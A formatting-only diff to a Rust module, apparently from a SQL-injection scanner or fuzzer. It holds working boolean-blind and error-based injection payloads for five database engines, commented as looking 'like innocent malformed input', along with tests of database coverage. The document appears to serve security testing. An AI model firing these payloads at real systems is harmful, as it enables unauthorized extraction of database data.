@@ -123,22 +123,43 @@ pub(crate) fn json_xml_mutations(max_mutations: usize) -> Vec<SqlMutation> {
 /// SLEEP/WAITFOR/BENCHMARK keywords to match.
 const BOOLEAN_BLINDS: &[(&str, &str)] = &[
     // Substring extraction — extract one character at a time
-    ("' AND SUBSTRING(@@version,1,1)='5'--", "mysql_version_probe"),
-    ("' AND ASCII(SUBSTRING((SELECT user()),1,1))>64--", "mysql_ascii_extract"),
+    (
+        "' AND SUBSTRING(@@version,1,1)='5'--",
+        "mysql_version_probe",
+    ),
+    (
+        "' AND ASCII(SUBSTRING((SELECT user()),1,1))>64--",
+        "mysql_ascii_extract",
+    ),
     ("' AND (SELECT LENGTH(user()))>0--", "mysql_length_probe"),
     // PostgreSQL boolean-blind
     ("' AND SUBSTRING(version(),1,1)='P'--", "pg_version_probe"),
     ("' AND (SELECT current_user)='postgres'--", "pg_user_probe"),
-    ("' AND (SELECT COUNT(*) FROM pg_tables)>0--", "pg_table_count"),
+    (
+        "' AND (SELECT COUNT(*) FROM pg_tables)>0--",
+        "pg_table_count",
+    ),
     // MSSQL boolean-blind
-    ("' AND SUBSTRING(@@version,1,1)='M'--", "mssql_version_probe"),
-    ("' AND (SELECT IS_SRVROLEMEMBER('sysadmin'))=1--", "mssql_role_probe"),
+    (
+        "' AND SUBSTRING(@@version,1,1)='M'--",
+        "mssql_version_probe",
+    ),
+    (
+        "' AND (SELECT IS_SRVROLEMEMBER('sysadmin'))=1--",
+        "mssql_role_probe",
+    ),
     // Oracle boolean-blind
     ("' AND SUBSTR(USER,1,1)='S'--", "oracle_user_probe"),
-    ("' AND (SELECT COUNT(*) FROM all_tables)>0--", "oracle_table_count"),
+    (
+        "' AND (SELECT COUNT(*) FROM all_tables)>0--",
+        "oracle_table_count",
+    ),
     // SQLite boolean-blind
     ("' AND SQLITE_VERSION() LIKE '3%'--", "sqlite_version_probe"),
-    ("' AND (SELECT COUNT(*) FROM sqlite_master)>0--", "sqlite_table_count"),
+    (
+        "' AND (SELECT COUNT(*) FROM sqlite_master)>0--",
+        "sqlite_table_count",
+    ),
 ];
 
 /// Error-based blind injection templates.
@@ -148,15 +169,24 @@ const BOOLEAN_BLINDS: &[(&str, &str)] = &[
 /// like innocent malformed input.
 const ERROR_BLINDS: &[(&str, &str)] = &[
     // MySQL error-based (extractvalue/updatexml)
-    ("' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--", "mysql_extractvalue"),
-    ("' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--", "mysql_updatexml"),
+    (
+        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "mysql_extractvalue",
+    ),
+    (
+        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--",
+        "mysql_updatexml",
+    ),
     // MSSQL error-based (convert/cast)
     ("' AND 1=CONVERT(int,(SELECT @@version))--", "mssql_convert"),
     ("' AND 1=CAST((SELECT DB_NAME()) AS int)--", "mssql_cast"),
     // PostgreSQL error-based (cast)
     ("' AND 1=CAST((SELECT version()) AS int)--", "pg_cast_error"),
     // Oracle error-based (CTXSYS.DRITHSX.SN)
-    ("' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))--", "oracle_utl_error"),
+    (
+        "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))--",
+        "oracle_utl_error",
+    ),
 ];
 
 /// Generate boolean-based blind SQL mutations.
@@ -221,31 +251,64 @@ mod tests {
     #[test]
     fn boolean_blind_generates_mutations() {
         let mutations = boolean_blind_mutations("' OR 1=1--", 50);
-        assert!(mutations.len() >= 10, "should produce at least 10 boolean-blind variants");
+        assert!(
+            mutations.len() >= 10,
+            "should produce at least 10 boolean-blind variants"
+        );
         // Verify no time-based keywords
         for m in &mutations {
             let lower = m.payload.to_ascii_lowercase();
-            assert!(!lower.contains("sleep"), "boolean-blind should not contain SLEEP");
-            assert!(!lower.contains("waitfor"), "boolean-blind should not contain WAITFOR");
-            assert!(!lower.contains("benchmark"), "boolean-blind should not contain BENCHMARK");
+            assert!(
+                !lower.contains("sleep"),
+                "boolean-blind should not contain SLEEP"
+            );
+            assert!(
+                !lower.contains("waitfor"),
+                "boolean-blind should not contain WAITFOR"
+            );
+            assert!(
+                !lower.contains("benchmark"),
+                "boolean-blind should not contain BENCHMARK"
+            );
         }
     }
 
     #[test]
     fn error_blind_generates_mutations() {
         let mutations = error_blind_mutations("' OR 1=1--", 50);
-        assert!(mutations.len() >= 5, "should produce at least 5 error-blind variants");
+        assert!(
+            mutations.len() >= 5,
+            "should produce at least 5 error-blind variants"
+        );
     }
 
     #[test]
     fn boolean_blind_covers_all_databases() {
         let mutations = boolean_blind_mutations("test", 50);
-        let rules: Vec<&str> = mutations.iter().flat_map(|m| m.rules_applied.iter().copied()).collect();
-        assert!(rules.iter().any(|r| r.contains("mysql")), "should cover MySQL");
-        assert!(rules.iter().any(|r| r.contains("pg")), "should cover PostgreSQL");
-        assert!(rules.iter().any(|r| r.contains("mssql")), "should cover MSSQL");
-        assert!(rules.iter().any(|r| r.contains("oracle")), "should cover Oracle");
-        assert!(rules.iter().any(|r| r.contains("sqlite")), "should cover SQLite");
+        let rules: Vec<&str> = mutations
+            .iter()
+            .flat_map(|m| m.rules_applied.iter().copied())
+            .collect();
+        assert!(
+            rules.iter().any(|r| r.contains("mysql")),
+            "should cover MySQL"
+        );
+        assert!(
+            rules.iter().any(|r| r.contains("pg")),
+            "should cover PostgreSQL"
+        );
+        assert!(
+            rules.iter().any(|r| r.contains("mssql")),
+            "should cover MSSQL"
+        );
+        assert!(
+            rules.iter().any(|r| r.contains("oracle")),
+            "should cover Oracle"
+        );
+        assert!(
+            rules.iter().any(|r| r.contains("sqlite")),
+            "should cover SQLite"
+        );
     }
 
     #[test]
